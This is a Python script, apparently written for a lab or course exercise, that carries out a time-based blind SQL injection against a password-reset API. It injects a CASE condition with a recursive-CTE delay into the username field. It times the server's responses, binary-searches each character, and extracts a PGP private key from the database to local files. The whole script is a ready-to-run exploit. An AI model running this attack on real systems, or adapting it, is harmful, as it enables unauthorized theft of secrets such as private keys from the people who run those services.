import time

import requests
from datetime import datetime
from loguru import logger

API_URL = 'http://lbs-2026-00.askarov.net:3030/reset/'
API_RUNS = 100
THRESHOLD_SECONDS = 2.0  # Safe gap for differential timing
COUNTER_DELAY = 8000000
PREFIX = "-----BEGIN PGP PRIVATE KEY BLOCK-----"
SUFFIX = "-----END PGP PRIVATE KEY BLOCK-----"
KNOWN_USER = {"username": "admin"}


def check_payload_true(known_user, sql_payload, threshold):
    # 1. Get a Stable Baseline
    # We loop until the server responds in under 10 seconds to ensure we aren't
    # testing against a massive queue which causes False Positives.
    baseline_time = 10  # Start high to enter loop
    retries = 0

    while baseline_time > 0.35:  # If baseline is above 350ms, we consider the server congeste
        if retries > 0:
            logger.warning(f"⚠️ Server congested (Lag: {baseline_time:.2f}s). Retrying for stable baseline...")
            time.sleep(10)  # Let the server breathe for a moment

        baseline_time = measure_response_time(API_URL, known_user)
        retries += 1

    # 2. Measure the Injection Time
    injection_time = measure_response_time(API_URL, sql_payload)

    # 3. Calculate the ACTUAL delay caused by SQL (Injection - Baseline)
    actual_delay = injection_time - baseline_time

    boolean_result = actual_delay > threshold
    # Debugging
    logger.debug(
        f"Base: {baseline_time:.2f}s | Inj: {injection_time:.2f}s | Diff: {actual_delay:.2f}s |boolean: {boolean_result}")

    # If the difference is significant (> 2.0s), it's a TRUE
    return boolean_result


def build_sql_payload(condition):
    return {
        f"username": "admin' AND (CASE WHEN ({condition}) THEN (SELECT sum(x) FROM (WITH RECURSIVE cnt(x) AS (VALUES(1) UNION ALL SELECT x+1 FROM cnt WHERE x<{COUNTER_DELAY}) SELECT x FROM cnt)) ELSE 0 END) like '1"}


def measure_response_time(url, input):
    start = time.perf_counter()
    requests.post(f"{url}", data=input)
    end = time.perf_counter()
    return end - start


def discover_char(known_user, key_index):
    low, high = 32, 126  # ASCII printable range
    # Binary search to find the character at key_index
    while low <= high:
        mid = (low + high) // 2
        condition = f"substr(key,{key_index + 1},1)>'{chr(mid)}'"
        sql_payload = build_sql_payload(condition)

        # Pass average_reponse_time (ignored inside, but kept for signature compatibility)
        char_is_higher = check_payload_true(known_user, sql_payload, THRESHOLD_SECONDS)

        if char_is_higher:
            low = mid + 1
        else:
            high = mid - 1

    return chr(low)


def initial_verification():
    prefix_payload = build_sql_payload(f"substr(key,1,{len(PREFIX)})='{PREFIX}'")
    logger.info("Checking if the key starts with the expected PGP header...")
    if (check_payload_true(KNOWN_USER, prefix_payload, THRESHOLD_SECONDS)):
        logger.info("✅ Prefix check passed")
    else:
        logger.warning("❌ Prefix check failed. The key does not start with the expected PGP header. Aborting attack.")
        exit(1)


def sql_injection_attack():
    logger.info(f"Starting SQL Injection Attack against the API at {API_URL}")

    initial_verification()

    key = PREFIX
    key_index = len(PREFIX)

    file_path = f"key_{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}.txt"
    with open(file_path, "w") as f:
        f.write(f"Server at: {API_URL}")
        f.write(f"\nKey index start at: {key_index}")
        logger.info(f"🔍 Starting key extraction at index {key_index}")
        while not key.endswith(SUFFIX):
            # Discover the character at current index
            character = discover_char(KNOWN_USER, key_index)
            f.write(character)
            key = key + character

            key_index += 1

            # Log progress every 10 characters to avoid flooding the logs
            if key_index % 10 == 0:
                logger.info(f"Progress: Extracted {key_index} characters so far...\n")
                logger.info(f"Current Key: {key}\n")

            # Safety check to prevent infinite loop in case of unexpected issues
            if len(key) > 5000:
                logger.warning("Stopping: Key exceeded 5000 characters without finding suffix.")
                break

    logger.info(f"Key extraction completed. Final key:\n{key}\n")
    file_path = f"final_key_{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}.txt"
    logger.info(f"Saving key to {file_path}...")
    with open(file_path, "w") as f:
        f.write(f"Server at: {API_URL}\n")
        f.write(key)
    logger.info(f"✅ Key saved to {file_path}")


if __name__ == '__main__':
    sql_injection_attack()
